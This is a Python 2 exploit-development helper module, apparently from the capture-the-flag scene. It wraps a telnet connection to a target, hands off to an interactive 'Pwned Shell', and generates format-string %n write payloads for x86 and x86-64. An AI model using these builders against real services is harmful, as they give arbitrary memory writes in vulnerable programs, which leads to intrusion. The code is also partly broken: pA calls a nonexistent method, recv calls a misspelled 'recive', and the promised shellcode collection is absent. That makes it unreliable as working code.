#!/usr/bin/python

# - This is Pwn module that helps you to build faster and easier payloads.
# - Pwn module works like a Interface (Abstract Class) that create a templet
# that you can base on it and create your payload.
# - Pwn module also support you create format string exploit easily, support x86 and x86-64
# - This module includes collection of shellcode, you can easily use it for your
# payload, supports Linux x86 and x86-64, arm will support later.
# - To install this module, you just copy this module to /usr/lib/python2.7 or python 3.1

# Author : Peternguyen
# Version : 0.2

import telnetlib
from ctypes import *
from struct import *

class Telnet(telnetlib.Telnet):
	def __init__(self,host,port):
		telnetlib.Telnet.__init__(self,host,port)
	# make easier when you want to send raw data to server
	def send(self,data):
		return self.get_socket().send(data)

	def recv(self,size):
		return self.get_socket().recv(size)

class Pwn():
	def __init__(self,**kwargs):
		# setting default values
		self.mode = 0 # for x86 mode is default mode
		self.host = 'localhost'
		self.port = 8888
		self.con = None

		# user inputs values
		for key,value in kwargs.iteritems():
			# setting some instances
			if key == 'mode':
				if type(value) is int:
					self.mode = value
				else:
					raise Exception('Unexpected value of self.mode')
			elif key == 'host':
				if type(value) is str:
					self.host = value
				else:
					raise Exception('Unexpected value of self.host')
			elif key == 'port':
				if type(value) is int:
					self.port = value
				else:
					raise Exception('Unexpected value of self.port')

	def connect(self):
		if not self.con:
			self.con = Telnet(self.host,self.port)
		else:
			raise Exception('You had connected.')

	# wrapper popular send/recive function
	def read_until(self,value):
		if self.con:
			return self.con.read_until(value)
		else:
			raise Exception('You must set isconnect = True')

	def write(self,value):
		if self.con:
			return self.con.write(value)
		else:
			raise Exception('You must set isconnect = True')

	def send(self,value):
		if self.con:
			return self.con.send(value)
		else:
			raise Exception('You must set isconnect = True')

	def recv(self,size):
		if self.con:
			return self.con.recive(size)
		else:
			raise Exception('You must set isconnect = True')

	def io(self):
		print '[+] Pwned Shell.'
		self.con.interact()

	# utilities method that support you make your payload easier
	def p32(self,value):
		return pack('<I',value)

	def up32(self,value):
		return unpack('<I',value)[0]

	def p64(self,value):
		return pack('<Q',value)

	def up64(self,value):
		return unpack('<Q',value)[0]

	# using pack,unpack simplier by defining mode value
	def pack(self,value):
		return self.p32(value) if self.mode == 0 else self.p64(value)

	def unpack(self,value):
		return self.up32(value) if self.mode == 0 else self.up64(value)

	def pA(self,ropchain):
		return ''.join([self.p(rop) for rop in ropchain])

	# building format string payload support 32 and 64 bit :)
	# you can ovewrite this method and make it better
	def build32FormatStringBug(self,address,write_address,offset,pad = ''):
		fmt = pad
		for i in xrange(4):
			fmt += pack('<I',address + i)

		length_pad = len(fmt)
		start = 0
		if c_byte(write_address & 0xff).value < length_pad:
			start += 0x100

		# generate write string
		for i in xrange(0,4):
			byte = (write_address >> (8*i)) & 0xff
			byte += start
			fmt += '%{0}x'.format((byte - length_pad)) + '%{0}$n'.format(offset + i)
			length_pad = byte
			start += 0x100
		
		return fmt

	# this method require you must find a stable format string and offset that make stack offset doesn't change.
	def build64FormatStringBug(self,address,write_address,offset,pad = ''):
		fmt = ''
		next = 0
		last = len(fmt) # length pad
		for i in xrange(8):
			byte = (write_address >> (8*i)) & 0xff
			byte += next
			fmt+= '%{0}x%{1}$n'.format(byte - last,offset + i)
			last = byte
			next += 0x100
		# fmt+= 'A'*20 # you may custom here
		fmt+= pad # stable pad must be appended here
		for i in xrange(8):
			fmt+= self.p64(address + i)

		return fmt

	# dynamic buildFormatStringBug
	def genFormatString(self,address,write_address,offset,pad = ''):
		if self.mode: # for 64 bits mode
			return self.build64FormatStringBug(address,write_address,offset,pad)
		else: # for 32 bits mode
			return self.build32FormatStringBug(address,write_address,offset,pad)
